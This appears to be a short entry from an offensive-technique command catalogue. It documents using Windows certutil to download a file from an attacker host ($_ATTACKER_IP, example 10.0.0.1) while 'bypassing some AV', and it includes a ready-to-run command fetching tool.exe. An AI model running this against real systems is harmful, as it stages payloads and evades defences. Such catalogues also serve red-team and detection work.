...
name: download-file-with-certutil
type: command
...
Downloads files from HTTP using built-in certutil, bypassing some AV.
...
| -split | Split downloads | Yes |
| -f | Force download | Yes |
| http://$_ATTACKER_IP/$_FILENAME | Source URL | Yes |
...
```command_prompt
certutil.exe -urlcache -split -f "http://10.0.0.1/tool.exe" "C:\temp\tool.exe"
```
